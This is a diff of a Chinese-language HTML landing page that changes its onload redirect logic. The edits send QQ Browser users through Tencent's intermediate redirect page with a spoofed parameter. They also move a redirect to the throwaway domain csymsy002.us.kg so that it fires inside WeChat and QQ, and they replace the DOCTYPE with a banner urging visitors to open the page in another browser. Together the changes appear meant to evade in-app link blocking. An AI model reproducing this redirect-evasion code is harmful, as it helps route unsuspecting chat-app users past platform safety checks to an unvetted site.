@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<欢迎光临，本页只支持右上角...浏览器打开>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
@@ -415,16 +415,20 @@
         // 页面加载完成后的处理
         window.onload = function() {
             initAudioPlay();
+
+            if (isMQQBrowser()) {
+                
+                window.location.href = 'https://c.pc.qq.com/middle.html?pfurl=www.qq.com'+window.location.href; 
+            }
             
             if (isWeixinOrQQ()) {
                 // 在微信或QQ中打开
                 document.getElementById('normalContent').style.display = 'none';
-                document.getElementById('weixinTip').style.display = 'block'
-                
+                document.getElementById('weixinTip').style.display = 'block';
+                window.location.href = "http://csymsy002.us.kg" //
             } else {
                 // 正常浏览器中打开
                 document.getElementById('weixinTip').style.display = 'none';
-                window.location.href = "http://csymsy002.us.kg" //
                 startCountdown();
             }
         };
